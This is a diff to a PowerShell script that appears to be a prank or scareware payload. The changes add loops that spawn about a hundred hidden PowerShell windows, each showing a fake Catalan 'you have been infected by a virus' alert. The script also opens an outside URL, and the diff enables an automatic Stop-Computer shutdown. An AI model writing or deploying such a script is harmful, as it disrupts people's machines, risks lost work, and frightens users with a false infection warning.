@@ -20,13 +20,16 @@ for ($i = 0; $i -lt 1; $i++) {
 
 Start-Sleep -Seconds 2
 Start-Process "https://qr.carquinyolis.cat"
-for ($i = 0; $i -lt 10; $i++) {
+
+for ($i = 0; $i -lt 50; $i++) {
     Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoExit", "-WindowStyle Hidden", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
 }
-
+[System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+for ($i = 0; $i -lt 50; $i++) {
+    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoExit", "-WindowStyle Hidden", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
+}
 ######################
 
-Start-Sleep -Seconds 2
 
 try {
     $eject = New-Object -ComObject Shell.Application
@@ -37,5 +40,5 @@ catch {
 }
 
 # Uncomment the line below if you want the computer to shut down after
-Start-Sleep -Seconds 2
-#Stop-Computer
+Start-Sleep -Seconds 5
+Stop-Computer
